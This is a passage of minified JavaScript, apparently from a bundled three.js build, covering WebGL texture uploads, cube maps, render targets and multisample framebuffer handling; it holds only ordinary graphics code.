C.isExternalTexture&&(L.__webglTexture=C.sourceTexture?C.sourceTexture:null);n.bindTexture(t.TEXTURE_2D_ARRAY,L.__webglTexture,t.TEXTURE0+v)}function H(C,v){const L=i.get(C);if(C.isRenderTargetTexture===!1&&C.version>0&&L.__version!==C.version){q(L,C,v);return}n.bindTexture(t.TEXTURE_3D,L.__webglTexture,t.TEXTURE0+v)}function I(C,v){const L=i.get(C);if(C.isCubeDepthTexture!==!0&&C.version>0&&L.__version!==C.version){O(L,C,v);return}n.bindTexture(t.TEXTURE_CUBE_MAP,L.__webglTexture,t.TEXTURE0+v)}const J={[Wa]:t.REPEAT,[bi]:t.CLAMP_TO_EDGE,[Td]:t.MIRRORED_REPEAT},K={[Vt]:t.NEAREST,[lw]:t.NEAREST_MIPMAP_NEAREST,[Ao]:t.NEAREST_MIPMAP_LINEAR,[Kt]:t.LINEAR,[zc]:t.LINEAR_MIPMAP_NEAREST,[Ps]:t.LINEAR_MIPMAP_LINEAR},ne={[dw]:t.NEVER,[gw]:t.ALWAYS,[pw]:t.LESS,[ph]:t.LEQUAL,[hw]:t.EQUAL,[hh]:t.GEQUAL,[fw]:t.GREATER,[mw]:t.NOTEQUAL};function we(C,v){if(v.type===ti&&e.has("OES_texture_float_linear")===!1&&(v.magFilter===Kt||v.magFilter===zc||v.magFilter===Ao||v.magFilter===Ps||v.minFilter===Kt||v.minFilter===zc||v.minFilter===Ao||v.minFilter===Ps)&&Ne("WebGLRenderer: Unable to use linear filtering with floating point textures. OES_texture_float_linear not supported on this device."),t.texParameteri(C,t.TEXTURE_WRAP_S,J[v.wrapS]),t.texParameteri(C,t.TEXTURE_WRAP_T,J[v.wrapT]),(C===t.TEXTURE_3D||C===t.TEXTURE_2D_ARRAY)&&t.texParameteri(C,t.TEXTURE_WRAP_R,J[v.wrapR]),t.texParameteri(C,t.TEXTURE_MAG_FILTER,K[v.magFilter]),t.texParameteri(C,t.TEXTURE_MIN_FILTER,K[v.minFilter]),v.compareFunction&&(t.texParameteri(C,t.TEXTURE_COMPARE_MODE,t.COMPARE_REF_TO_TEXTURE),t.texParameteri(C,t.TEXTURE_COMPARE_FUNC,ne[v.compareFunction])),e.has("EXT_texture_filter_anisotropic")===!0){if(v.magFilter===Vt||v.minFilter!==Ao&&v.minFilter!==Ps||v.type===ti&&e.has("OES_texture_float_linear")===!1)return;if(v.anisotropy>1||i.get(v).__currentAnisotropy){const L=e.get("EXT_texture_filter_anisotropic");t.texParameterf(C,L.TEXTURE_MAX_ANISOTROPY_EXT,Math.min(v.anisotropy,s.getMaxAnisotropy())),i.get(v).__currentAnisotropy=v.anisotropy}}}function Pe(C,v){let L=!1;C.__webglInit===void 0&&(C.__webglInit=!0,v.addEventListener("dispose",A));const Y=v.source;let Q=h.get(Y);Q===void 0&&(Q={},h.set(Y,Q));const j=Z(v);if(j!==C.__cacheKey){Q[j]===void 0&&(Q[j]={texture:t.createTexture(),usedTimes:0},a.memory.textures++,L=!0),Q[j].usedTimes++;const Te=Q[C.__cacheKey];Te!==void 0&&(Q[C.__cacheKey].usedTimes--,Te.usedTimes===0&&b(v)),C.__cacheKey=j,C.__webglTexture=Q[j].texture}return L}function Ge(C,v,L){return Math.floor(Math.floor(C/L)/v)}function Ke(C,v,L,Y){const j=C.updateRanges;if(j.length===0)n.texSubImage2D(t.TEXTURE_2D,0,0,0,v.width,v.height,L,Y,v.data);else{j.sort((re,ue)=>re.start-ue.start);let Te=0;for(let re=1;re<j.length;re++){const ue=j[Te],be=j[re],Ee=ue.start+ue.count,ce=Ge(be.start,v.width,4),ze=Ge(ue.start,v.width,4);be.start<=Ee+1&&ce===ze&&Ge(be.start+be.count-1,v.width,4)===ce?ue.count=Math.max(ue.count,be.start+be.count-ue.start):(++Te,j[Te]=be)}j.length=Te+1;const le=t.getParameter(t.UNPACK_ROW_LENGTH),Me=t.getParameter(t.UNPACK_SKIP_PIXELS),ke=t.getParameter(t.UNPACK_SKIP_ROWS);t.pixelStorei(t.UNPACK_ROW_LENGTH,v.width);for(let re=0,ue=j.length;re<ue;re++){const be=j[re],Ee=Math.floor(be.start/4),ce=Math.ceil(be.count/4),ze=Ee%v.width,D=Math.floor(Ee/v.width),fe=ce,ae=1;t.pixelStorei(t.UNPACK_SKIP_PIXELS,ze),t.pixelStorei(t.UNPACK_SKIP_ROWS,D),n.texSubImage2D(t.TEXTURE_2D,0,ze,D,fe,ae,L,Y,v.data)}C.clearUpdateRanges(),t.pixelStorei(t.UNPACK_ROW_LENGTH,le),t.pixelStorei(t.UNPACK_SKIP_PIXELS,Me),t.pixelStorei(t.UNPACK_SKIP_ROWS,ke)}}function q(C,v,L){let Y=t.TEXTURE_2D;(v.isDataArrayTexture||v.isCompressedArrayTexture)&&(Y=t.TEXTURE_2D_ARRAY),v.isData3DTexture&&(Y=t.TEXTURE_3D);const Q=Pe(C,v),j=v.source;n.bindTexture(Y,C.__webglTexture,t.TEXTURE0+L);const Te=i.get(j);if(j.version!==Te.__version||Q===!0){n.activeTexture(t.TEXTURE0+L);const le=Ye.getPrimaries(Ye.workingColorSpace),Me=v.colorSpace===qi?null:Ye.getPrimaries(v.colorSpace),ke=v.colorSpace===qi||le===Me?t.NONE:t.BROWSER_DEFAULT_WEBGL;t.pixelStorei(t.UNPACK_FLIP_Y_WEBGL,v.flipY),t.pixelStorei(t.UNPACK_PREMULTIPLY_ALPHA_WEBGL,v.premultiplyAlpha),t.pixelStorei(t.UNPACK_ALIGNMENT,v.unpackAlignment),t.pixelStorei(t.UNPACK_COLORSPACE_CONVERSION_WEBGL,ke);let re=y(v.image,!1,s.maxTextureSize);re=at(v,re);const ue=r.convert(v.format,v.colorSpace),be=r.convert(v.type);let Ee=x(v.internalFormat,ue,be,v.colorSpace,v.isVideoTexture);we(Y,v);let ce;const ze=v.mipmaps,D=v.isVideoTexture!==!0,fe=Te.__version===void 0||Q===!0,ae=j.dataReady,me=T(v,re);if(v.isDepthTexture)Ee=S(v.format===Ls,v.type),fe&&(D?n.texStorage2D(t.TEXTURE_2D,1,Ee,re.width,re.height):n.texImage2D(t.TEXTURE_2D,0,Ee,re.width,re.height,0,ue,be,null));else if(v.isDataTexture)if(ze.length>0){D&&fe&&n.texStorage2D(t.TEXTURE_2D,me,Ee,ze[0].width,ze[0].height);for(let ie=0,te=ze.length;ie<te;ie++)ce=ze[ie],D?ae&&n.texSubImage2D(t.TEXTURE_2D,ie,0,0,ce.width,ce.height,ue,be,ce.data):n.texImage2D(t.TEXTURE_2D,ie,Ee,ce.width,ce.height,0,ue,be,ce.data);v.generateMipmaps=!1}else D?(fe&&n.texStorage2D(t.TEXTURE_2D,me,Ee,re.width,re.height),ae&&Ke(v,re,ue,be)):n.texImage2D(t.TEXTURE_2D,0,Ee,re.width,re.height,0,ue,be,re.data);else if(v.isCompressedTexture)if(v.isCompressedArrayTexture){D&&fe&&n.texStorage3D(t.TEXTURE_2D_ARRAY,me,Ee,ze[0].width,ze[0].height,re.depth);for(let ie=0,te=ze.length;ie<te;ie++)if(ce=ze[ie],v.format!==jn)if(ue!==null)if(D){if(ae)if(v.layerUpdates.size>0){const oe=Tm(ce.width,ce.height,v.format,v.type);for(const De of v.layerUpdates){const ct=ce.data.subarray(De*oe/ce.data.BYTES_PER_ELEMENT,(De+1)*oe/ce.data.BYTES_PER_ELEMENT);n.compressedTexSubImage3D(t.TEXTURE_2D_ARRAY,ie,0,0,De,ce.width,ce.height,1,ue,ct)}v.clearLayerUpdates()}else n.compressedTexSubImage3D(t.TEXTURE_2D_ARRAY,ie,0,0,0,ce.width,ce.height,re.depth,ue,ce.data)}else n.compressedTexImage3D(t.TEXTURE_2D_ARRAY,ie,Ee,ce.width,ce.height,re.depth,0,ce.data,0,0);else Ne("WebGLRenderer: Attempt to load unsupported compressed texture format in .uploadTexture()");else D?ae&&n.texSubImage3D(t.TEXTURE_2D_ARRAY,ie,0,0,0,ce.width,ce.height,re.depth,ue,be,ce.data):n.texImage3D(t.TEXTURE_2D_ARRAY,ie,Ee,ce.width,ce.height,re.depth,0,ue,be,ce.data)}else{D&&fe&&n.texStorage2D(t.TEXTURE_2D,me,Ee,ze[0].width,ze[0].height);for(let ie=0,te=ze.length;ie<te;ie++)ce=ze[ie],v.format!==jn?ue!==null?D?ae&&n.compressedTexSubImage2D(t.TEXTURE_2D,ie,0,0,ce.width,ce.height,ue,ce.data):n.compressedTexImage2D(t.TEXTURE_2D,ie,Ee,ce.width,ce.height,0,ce.data):Ne("WebGLRenderer: Attempt to load unsupported compressed texture format in .uploadTexture()"):D?ae&&n.texSubImage2D(t.TEXTURE_2D,ie,0,0,ce.width,ce.height,ue,be,ce.data):n.texImage2D(t.TEXTURE_2D,ie,Ee,ce.width,ce.height,0,ue,be,ce.data)}else if(v.isDataArrayTexture)if(D){if(fe&&n.texStorage3D(t.TEXTURE_2D_ARRAY,me,Ee,re.width,re.height,re.depth),ae)if(v.layerUpdates.size>0){const ie=Tm(re.width,re.height,v.format,v.type);for(const te of v.layerUpdates){const oe=re.data.subarray(te*ie/re.data.BYTES_PER_ELEMENT,(te+1)*ie/re.data.BYTES_PER_ELEMENT);n.texSubImage3D(t.TEXTURE_2D_ARRAY,0,0,0,te,re.width,re.height,1,ue,be,oe)}v.clearLayerUpdates()}else n.texSubImage3D(t.TEXTURE_2D_ARRAY,0,0,0,0,re.width,re.height,re.depth,ue,be,re.data)}else n.texImage3D(t.TEXTURE_2D_ARRAY,0,Ee,re.width,re.height,re.depth,0,ue,be,re.data);else if(v.isData3DTexture)D?(fe&&n.texStorage3D(t.TEXTURE_3D,me,Ee,re.width,re.height,re.depth),ae&&n.texSubImage3D(t.TEXTURE_3D,0,0,0,0,re.width,re.height,re.depth,ue,be,re.data)):n.texImage3D(t.TEXTURE_3D,0,Ee,re.width,re.height,re.depth,0,ue,be,re.data);else if(v.isFramebufferTexture){if(fe)if(D)n.texStorage2D(t.TEXTURE_2D,me,Ee,re.width,re.height);else{let ie=re.width,te=re.height;for(let oe=0;oe<me;oe++)n.texImage2D(t.TEXTURE_2D,oe,Ee,ie,te,0,ue,be,null),ie>>=1,te>>=1}}else if(ze.length>0){if(D&&fe){const ie=Se(ze[0]);n.texStorage2D(t.TEXTURE_2D,me,Ee,ie.width,ie.height)}for(let ie=0,te=ze.length;ie<te;ie++)ce=ze[ie],D?ae&&n.texSubImage2D(t.TEXTURE_2D,ie,0,0,ue,be,ce):n.texImage2D(t.TEXTURE_2D,ie,Ee,ue,be,ce);v.generateMipmaps=!1}else if(D){if(fe){const ie=Se(re);n.texStorage2D(t.TEXTURE_2D,me,Ee,ie.width,ie.height)}ae&&n.texSubImage2D(t.TEXTURE_2D,0,0,0,ue,be,re)}else n.texImage2D(t.TEXTURE_2D,0,Ee,ue,be,re);m(v)&&u(Y),Te.__version=j.version,v.onUpdate&&v.onUpdate(v)}C.__version=v.version}function O(C,v,L){if(v.image.length!==6)return;const Y=Pe(C,v),Q=v.source;n.bindTexture(t.TEXTURE_CUBE_MAP,C.__webglTexture,t.TEXTURE0+L);const j=i.get(Q);if(Q.version!==j.__version||Y===!0){n.activeTexture(t.TEXTURE0+L);const Te=Ye.getPrimaries(Ye.workingColorSpace),le=v.colorSpace===qi?null:Ye.getPrimaries(v.colorSpace),Me=v.colorSpace===qi||Te===le?t.NONE:t.BROWSER_DEFAULT_WEBGL;t.pixelStorei(t.UNPACK_FLIP_Y_WEBGL,v.flipY),t.pixelStorei(t.UNPACK_PREMULTIPLY_ALPHA_WEBGL,v.premultiplyAlpha),t.pixelStorei(t.UNPACK_ALIGNMENT,v.unpackAlignment),t.pixelStorei(t.UNPACK_COLORSPACE_CONVERSION_WEBGL,Me);const ke=v.isCompressedTexture||v.image[0].isCompressedTexture,re=v.image[0]&&v.image[0].isDataTexture,ue=[];for(let te=0;te<6;te++)!ke&&!re?ue[te]=y(v.image[te],!0,s.maxCubemapSize):ue[te]=re?v.image[te].image:v.image[te],ue[te]=at(v,ue[te]);const be=ue[0],Ee=r.convert(v.format,v.colorSpace),ce=r.convert(v.type),ze=x(v.internalFormat,Ee,ce,v.colorSpace),D=v.isVideoTexture!==!0,fe=j.__version===void 0||Y===!0,ae=Q.dataReady;let me=T(v,be);we(t.TEXTURE_CUBE_MAP,v);let ie;if(ke){D&&fe&&n.texStorage2D(t.TEXTURE_CUBE_MAP,me,ze,be.width,be.height);for(let te=0;te<6;te++){ie=ue[te].mipmaps;for(let oe=0;oe<ie.length;oe++){const De=ie[oe];v.format!==jn?Ee!==null?D?ae&&n.compressedTexSubImage2D(t.TEXTURE_CUBE_MAP_POSITIVE_X+te,oe,0,0,De.width,De.height,Ee,De.data):n.compressedTexImage2D(t.TEXTURE_CUBE_MAP_POSITIVE_X+te,oe,ze,De.width,De.height,0,De.data):Ne("WebGLRenderer: Attempt to load unsupported compressed texture format in .setTextureCube()"):D?ae&&n.texSubImage2D(t.TEXTURE_CUBE_MAP_POSITIVE_X+te,oe,0,0,De.width,De.height,Ee,ce,De.data):n.texImage2D(t.TEXTURE_CUBE_MAP_POSITIVE_X+te,oe,ze,De.width,De.height,0,Ee,ce,De.data)}}}else{if(ie=v.mipmaps,D&&fe){ie.length>0&&me++;const te=Se(ue[0]);n.texStorage2D(t.TEXTURE_CUBE_MAP,me,ze,te.width,te.height)}for(let te=0;te<6;te++)if(re){D?ae&&n.texSubImage2D(t.TEXTURE_CUBE_MAP_POSITIVE_X+te,0,0,0,ue[te].width,ue[te].height,Ee,ce,ue[te].data):n.texImage2D(t.TEXTURE_CUBE_MAP_POSITIVE_X+te,0,ze,ue[te].width,ue[te].height,0,Ee,ce,ue[te].data);for(let oe=0;oe<ie.length;oe++){const ct=ie[oe].image[te].image;D?ae&&n.texSubImage2D(t.TEXTURE_CUBE_MAP_POSITIVE_X+te,oe+1,0,0,ct.width,ct.height,Ee,ce,ct.data):n.texImage2D(t.TEXTURE_CUBE_MAP_POSITIVE_X+te,oe+1,ze,ct.width,ct.height,0,Ee,ce,ct.data)}}else{D?ae&&n.texSubImage2D(t.TEXTURE_CUBE_MAP_POSITIVE_X+te,0,0,0,Ee,ce,ue[te]):n.texImage2D(t.TEXTURE_CUBE_MAP_POSITIVE_X+te,0,ze,Ee,ce,ue[te]);for(let oe=0;oe<ie.length;oe++){const De=ie[oe];D?ae&&n.texSubImage2D(t.TEXTURE_CUBE_MAP_POSITIVE_X+te,oe+1,0,0,Ee,ce,De.image[te]):n.texImage2D(t.TEXTURE_CUBE_MAP_POSITIVE_X+te,oe+1,ze,Ee,ce,De.image[te])}}}m(v)&&u(t.TEXTURE_CUBE_MAP),j.__version=Q.version,v.onUpdate&&v.onUpdate(v)}C.__version=v.version}function ge(C,v,L,Y,Q,j){const Te=r.convert(L.format,L.colorSpace),le=r.convert(L.type),Me=x(L.internalFormat,Te,le,L.colorSpace),ke=i.get(v),re=i.get(L);if(re.__renderTarget=v,!ke.__hasExternalTextures){const ue=Math.max(1,v.width>>j),be=Math.max(1,v.height>>j);Q===t.TEXTURE_3D||Q===t.TEXTURE_2D_ARRAY?n.texImage3D(Q,j,Me,ue,be,v.depth,0,Te,le,null):n.texImage2D(Q,j,Me,ue,be,0,Te,le,null)}n.bindFramebuffer(t.FRAMEBUFFER,C),yt(v)?o.framebufferTexture2DMultisampleEXT(t.FRAMEBUFFER,Y,Q,re.__webglTexture,0,k(v)):(Q===t.TEXTURE_2D||Q>=t.TEXTURE_CUBE_MAP_POSITIVE_X&&Q<=t.TEXTURE_CUBE_MAP_NEGATIVE_Z)&&t.framebufferTexture2D(t.FRAMEBUFFER,Y,Q,re.__webglTexture,j),n.bindFramebuffer(t.FRAMEBUFFER,null)}function Ue(C,v,L){if(t.bindRenderbuffer(t.RENDERBUFFER,C),v.depthBuffer){const Y=v.depthTexture,Q=Y&&Y.isDepthTexture?Y.type:null,j=S(v.stencilBuffer,Q),Te=v.stencilBuffer?t.DEPTH_STENCIL_ATTACHMENT:t.DEPTH_ATTACHMENT;yt(v)?o.renderbufferStorageMultisampleEXT(t.RENDERBUFFER,k(v),j,v.width,v.height):L?t.renderbufferStorageMultisample(t.RENDERBUFFER,k(v),j,v.width,v.height):t.renderbufferStorage(t.RENDERBUFFER,j,v.width,v.height),t.framebufferRenderbuffer(t.FRAMEBUFFER,Te,t.RENDERBUFFER,C)}else{const Y=v.textures;for(let Q=0;Q<Y.length;Q++){const j=Y[Q],Te=r.convert(j.format,j.colorSpace),le=r.convert(j.type),Me=x(j.internalFormat,Te,le,j.colorSpace);yt(v)?o.renderbufferStorageMultisampleEXT(t.RENDERBUFFER,k(v),Me,v.width,v.height):L?t.renderbufferStorageMultisample(t.RENDERBUFFER,k(v),Me,v.width,v.height):t.renderbufferStorage(t.RENDERBUFFER,Me,v.width,v.height)}}t.bindRenderbuffer(t.RENDERBUFFER,null)}function ye(C,v,L){const Y=v.isWebGLCubeRenderTarget===!0;if(n.bindFramebuffer(t.FRAMEBUFFER,C),!(v.depthTexture&&v.depthTexture.isDepthTexture))throw new Error("renderTarget.depthTexture must be an instance of THREE.DepthTexture");const Q=i.get(v.depthTexture);if(Q.__renderTarget=v,(!Q.__webglTexture||v.depthTexture.image.width!==v.width||v.depthTexture.image.height!==v.height)&&(v.depthTexture.image.width=v.width,v.depthTexture.image.height=v.height,v.depthTexture.needsUpdate=!0),Y){if(Q.__webglInit===void 0&&(Q.__webglInit=!0,v.depthTexture.addEventListener("dispose",A)),Q.__webglTexture===void 0){Q.__webglTexture=t.createTexture(),n.bindTexture(t.TEXTURE_CUBE_MAP,Q.__webglTexture),we(t.TEXTURE_CUBE_MAP,v.depthTexture);const ke=r.convert(v.depthTexture.format),re=r.convert(v.depthTexture.type);let ue;v.depthTexture.format===ki?ue=t.DEPTH_COMPONENT24:v.depthTexture.format===Ls&&(ue=t.DEPTH24_STENCIL8);for(let be=0;be<6;be++)t.texImage2D(t.TEXTURE_CUBE_MAP_POSITIVE_X+be,0,ue,v.width,v.height,0,ke,re,null)}}else $(v.depthTexture,0);const j=Q.__webglTexture,Te=k(v),le=Y?t.TEXTURE_CUBE_MAP_POSITIVE_X+L:t.TEXTURE_2D,Me=v.depthTexture.format===Ls?t.DEPTH_STENCIL_ATTACHMENT:t.DEPTH_ATTACHMENT;if(v.depthTexture.format===ki)yt(v)?o.framebufferTexture2DMultisampleEXT(t.FRAMEBUFFER,Me,le,j,0,Te):t.framebufferTexture2D(t.FRAMEBUFFER,Me,le,j,0);else if(v.depthTexture.format===Ls)yt(v)?o.framebufferTexture2DMultisampleEXT(t.FRAMEBUFFER,Me,le,j,0,Te):t.framebufferTexture2D(t.FRAMEBUFFER,Me,le,j,0);else throw new Error("Unknown depthTexture format")}function Xe(C){const v=i.get(C),L=C.isWebGLCubeRenderTarget===!0;if(v.__boundDepthTexture!==C.depthTexture){const Y=C.depthTexture;if(v.__depthDisposeCallback&&v.__depthDisposeCallback(),Y){const Q=()=>{delete v.__boundDepthTexture,delete v.__depthDisposeCallback,Y.removeEventListener("dispose",Q)};Y.addEventListener("dispose",Q),v.__depthDisposeCallback=Q}v.__boundDepthTexture=Y}if(C.depthTexture&&!v.__autoAllocateDepthBuffer)if(L)for(let Y=0;Y<6;Y++)ye(v.__webglFramebuffer[Y],C,Y);else{const Y=C.texture.mipmaps;Y&&Y.length>0?ye(v.__webglFramebuffer[0],C,0):ye(v.__webglFramebuffer,C,0)}else if(L){v.__webglDepthbuffer=[];for(let Y=0;Y<6;Y++)if(n.bindFramebuffer(t.FRAMEBUFFER,v.__webglFramebuffer[Y]),v.__webglDepthbuffer[Y]===void 0)v.__webglDepthbuffer[Y]=t.createRenderbuffer(),Ue(v.__webglDepthbuffer[Y],C,!1);else{const Q=C.stencilBuffer?t.DEPTH_STENCIL_ATTACHMENT:t.DEPTH_ATTACHMENT,j=v.__webglDepthbuffer[Y];t.bindRenderbuffer(t.RENDERBUFFER,j),t.framebufferRenderbuffer(t.FRAMEBUFFER,Q,t.RENDERBUFFER,j)}}else{const Y=C.texture.mipmaps;if(Y&&Y.length>0?n.bindFramebuffer(t.FRAMEBUFFER,v.__webglFramebuffer[0]):n.bindFramebuffer(t.FRAMEBUFFER,v.__webglFramebuffer),v.__webglDepthbuffer===void 0)v.__webglDepthbuffer=t.createRenderbuffer(),Ue(v.__webglDepthbuffer,C,!1);else{const Q=C.stencilBuffer?t.DEPTH_STENCIL_ATTACHMENT:t.DEPTH_ATTACHMENT,j=v.__webglDepthbuffer;t.bindRenderbuffer(t.RENDERBUFFER,j),t.framebufferRenderbuffer(t.FRAMEBUFFER,Q,t.RENDERBUFFER,j)}}n.bindFramebuffer(t.FRAMEBUFFER,null)}function Tt(C,v,L){const Y=i.get(C);v!==void 0&&ge(Y.__webglFramebuffer,C,C.texture,t.COLOR_ATTACHMENT0,t.TEXTURE_2D,0),L!==void 0&&Xe(C)}function Ve(C){const v=C.texture,L=i.get(C),Y=i.get(v);C.addEventListener("dispose",R);const Q=C.textures,j=C.isWebGLCubeRenderTarget===!0,Te=Q.length>1;if(Te||(Y.__webglTexture===void 0&&(Y.__webglTexture=t.createTexture()),Y.__version=v.version,a.memory.textures++),j){L.__webglFramebuffer=[];for(let le=0;le<6;le++)if(v.mipmaps&&v.mipmaps.length>0){L.__webglFramebuffer[le]=[];for(let Me=0;Me<v.mipmaps.length;Me++)L.__webglFramebuffer[le][Me]=t.createFramebuffer()}else L.__webglFramebuffer[le]=t.createFramebuffer()}else{if(v.mipmaps&&v.mipmaps.length>0){L.__webglFramebuffer=[];for(let le=0;le<v.mipmaps.length;le++)L.__webglFramebuffer[le]=t.createFramebuffer()}else L.__webglFramebuffer=t.createFramebuffer();if(Te)for(let le=0,Me=Q.length;le<Me;le++){const ke=i.get(Q[le]);ke.__webglTexture===void 0&&(ke.__webglTexture=t.createTexture(),a.memory.textures++)}if(C.samples>0&&yt(C)===!1){L.__webglMultisampledFramebuffer=t.createFramebuffer(),L.__webglColorRenderbuffer=[],n.bindFramebuffer(t.FRAMEBUFFER,L.__webglMultisampledFramebuffer);for(let le=0;le<Q.length;le++){const Me=Q[le];L.__webglColorRenderbuffer[le]=t.createRenderbuffer(),t.bindRenderbuffer(t.RENDERBUFFER,L.__webglColorRenderbuffer[le]);const ke=r.convert(Me.format,Me.colorSpace),re=r.convert(Me.type),ue=x(Me.internalFormat,ke,re,Me.colorSpace,C.isXRRenderTarget===!0),be=k(C);t.renderbufferStorageMultisample(t.RENDERBUFFER,be,ue,C.width,C.height),t.framebufferRenderbuffer(t.FRAMEBUFFER,t.COLOR_ATTACHMENT0+le,t.RENDERBUFFER,L.__webglColorRenderbuffer[le])}t.bindRenderbuffer(t.RENDERBUFFER,null),C.depthBuffer&&(L.__webglDepthRenderbuffer=t.createRenderbuffer(),Ue(L.__webglDepthRenderbuffer,C,!0)),n.bindFramebuffer(t.FRAMEBUFFER,null)}}if(j){n.bindTexture(t.TEXTURE_CUBE_MAP,Y.__webglTexture),we(t.TEXTURE_CUBE_MAP,v);for(let le=0;le<6;le++)if(v.mipmaps&&v.mipmaps.length>0)for(let Me=0;Me<v.mipmaps.length;Me++)ge(L.__webglFramebuffer[le][Me],C,v,t.COLOR_ATTACHMENT0,t.TEXTURE_CUBE_MAP_POSITIVE_X+le,Me);else ge(L.__webglFramebuffer[le],C,v,t.COLOR_ATTACHMENT0,t.TEXTURE_CUBE_MAP_POSITIVE_X+le,0);m(v)&&u(t.TEXTURE_CUBE_MAP),n.unbindTexture()}else if(Te){for(let le=0,Me=Q.length;le<Me;le++){const ke=Q[le],re=i.get(ke);let ue=t.TEXTURE_2D;(C.isWebGL3DRenderTarget||C.isWebGLArrayRenderTarget)&&(ue=C.isWebGL3DRenderTarget?t.TEXTURE_3D:t.TEXTURE_2D_ARRAY),n.bindTexture(ue,re.__webglTexture),we(ue,ke),ge(L.__webglFramebuffer,C,ke,t.COLOR_ATTACHMENT0+le,ue,0),m(ke)&&u(ue)}n.unbindTexture()}else{let le=t.TEXTURE_2D;if((C.isWebGL3DRenderTarget||C.isWebGLArrayRenderTarget)&&(le=C.isWebGL3DRenderTarget?t.TEXTURE_3D:t.TEXTURE_2D_ARRAY),n.bindTexture(le,Y.__webglTexture),we(le,v),v.mipmaps&&v.mipmaps.length>0)for(let Me=0;Me<v.mipmaps.length;Me++)ge(L.__webglFramebuffer[Me],C,v,t.COLOR_ATTACHMENT0,le,Me);else ge(L.__webglFramebuffer,C,v,t.COLOR_ATTACHMENT0,le,0);m(v)&&u(le),n.unbindTexture()}C.depthBuffer&&Xe(C)}function qe(C){const v=C.textures;for(let L=0,Y=v.length;L<Y;L++){const Q=v[L];if(m(Q)){const j=g(C),Te=i.get(Q).__webglTexture;n.bindTexture(j,Te),u(j),n.unbindTexture()}}}const tt=[],Oe=[];function pt(C){if(C.samples>0){if(yt(C)===!1){const v=C.textures,L=C.width,Y=C.height;let Q=t.COLOR_BUFFER_BIT;const j=C.stencilBuffer?t.DEPTH_STENCIL_ATTACHMENT:t.DEPTH_ATTACHMENT,Te=i.get(C),le=v.length>1;if(le)for(let ke=0;ke<v.length;ke++)n.bindFramebuffer(t.FRAMEBUFFER,Te.__webglMultisampledFramebuffer),t.framebufferRenderbuffer(t.FRAMEBUFFER,t.COLOR_ATTACHMENT0+ke,t.RENDERBUFFER,null),n.bindFramebuffer(t.FRAMEBUFFER,Te.__webglFramebuffer),t.framebufferTexture2D(t.DRAW_FRAMEBUFFER,t.COLOR_ATTACHMENT0+ke,t.TEXTURE_2D,null,0);n.bindFramebuffer(t.READ_FRAMEBUFFER,Te.__webglMultisampledFramebuffer);const Me=C.texture.mipmaps;Me&&Me.length>0?n.bindFramebuffer(t.DRAW_FRAMEBUFFER,Te.__webglFramebuffer[0]):n.bindFramebuffer(t.DRAW_FRAMEBUFFER,Te.__webglFramebuffer);for(let ke=0;ke<v.length;ke++){if(C.resolveDepthBuffer&&(C.depthBuffer&&(Q|=t.DEPTH_BUFFER_BIT),C.stencilBuffer&&C.resolveStencilBuffer&&(Q|=t.STENCIL_BUFFER_BIT)),le){t.framebufferRenderbuffer(t.READ_FRAMEBUFFER,t.COLOR_ATTACHMENT0,t.RENDERBUFFER,Te.__webglColorRenderbuffer[ke]);const re=i.get(v[ke]).__webglTexture;t.framebufferTexture2D(t.DRAW_FRAMEBUFFER,t.COLOR_ATTACHMENT0,t.TEXTURE_2D,re,0)}t.blitFramebuffer(0,0,L,Y,0,0,L,Y,Q,t.NEAREST),l===!0&&(tt.length=0,Oe.length=0,tt.push(t.COLOR_ATTACHMENT0+ke),C.depthBuffer&&C.resolveDepthBuffer===!1&&(tt.push(j),Oe.push(j),t.invalidateFramebuffer(t.DRAW_FRAMEBUFFER,Oe)),t.invalidateFramebuffer(t.READ_FRAMEBUFFER,tt))}if(n.bindFramebuffer(t.READ_FRAMEBUFFER,null),n.bindFramebuffer(t.DRAW_FRAMEBUFFER,null),le)for(let ke=0;ke<v.length;ke++){n.bindFramebuffer(t.FRAMEBUFFER,Te.__webglMultisampledFramebuffer),t.framebufferRenderbuffer(t.FRAMEBUFFER,t.COLOR_ATTACHMENT0+ke,t.RENDERBUFFER,Te.__webglColorRenderbuffer[ke]);const re=i.get(v[ke]).__webglTexture;n.bindFramebuffer(t.FRAMEBUFFER,Te.__webglFramebuffer),t.framebufferTexture2D(t.DRAW_FRAMEBUFFER,t.COLOR_ATTACHMENT0+ke,t.TEXTURE_2D,re,0)}n.bindFramebuffer(t.DRAW_FRAMEBUFFER,Te.__webglMultisampledFramebuffer)}else if(C.depthBuffer&&C.resolveDepthBuffer===!1&&l){const v=C.stencilBuffer?t.DEPTH_STENCIL_ATTACHMENT:t.DEPTH_ATTACHMENT;t.invalidateFramebuffer(t.DRAW_FRAMEBUFFER,[v])}}}function k(C){return Math.min(s.maxSamples,C.samples)}function yt(C){const v=i.get(C);return C.samples>0&&e.has("WEBGL_multisampled_render_to_texture")===!0&&v.__useRenderToTexture!==!1}function Ze(C){const v=a.render.frame;d.get(C)!==v&&(d.set(C,v),C.update())}function at(C,v){const L=C.colorSpace,Y=C.format,Q=C.type;return C.isCompressedTexture===!0||C.isVideoTexture===!0||L!==Or&&L!==qi&&(Ye.getTransfer(L)===st?(Y!==jn||Q!==Sn)&&Ne("WebGLTextures: sRGB encoded textures have to use RGBAFormat and UnsignedByteType."):Qe("WebGLTextures: Unsupported texture color space:",L)),v}function Se(C){return typeof HTMLImageElement<"u"&&C instanceof HTMLImageElement?(c.width=C.naturalWidth||C.width,c.height=C.naturalHeight||C.height):typeof VideoFrame<"u"&&C instanceof VideoFrame?(c.width=C.displayWidth,c.height=C.displayHeight):(c.width=C.width,c.height=C.height),c}this.allocateTextureUnit=V,this.resetTextureUnits=z,this.setTexture2D=$,this.setTexture2DArray=X,this.setTexture3D=H,this.setTextureCube=I,this.rebindTextures=Tt,this.setupRenderTarget=Ve,this.updateRenderTargetMipmap=qe,this.updateMultisampleRenderTarget=pt,this.setupDepthRenderbuffer=Xe,this.setupFrameBufferTexture=ge,this.useMultisampledRTT=yt,this.isReversedDepthBuffer=function(){return n.buffers.depth.getReversed()}}function GA(t,e){function n(i,s=qi){let r;const a=Ye.getTransfer(s);if(i===Sn)return t.UNSIGNED_BYTE;if(i===oh)return t.UNSIGNED_SHORT_4_4_4_4;if(i===lh)return t.UNSIGNED_SHORT_5_5_5_1;if(i===z0)return t.UNSIGNED_INT_5_9_9_9_REV;if(i===V0)return t.UNSIGNED_INT_10F_11F_11F_REV;if(i===F0)return t.BYTE;if(i===B0)return t.SHORT;if(i===ja)return t.UNSIGNED_SHORT;if(i===ah)return t.INT;if(i===li)return t.UNSIGNED_INT;if(i===ti)return t.FLOAT;if(i===Li)return t.HALF_FLOAT;if(i===H0)return 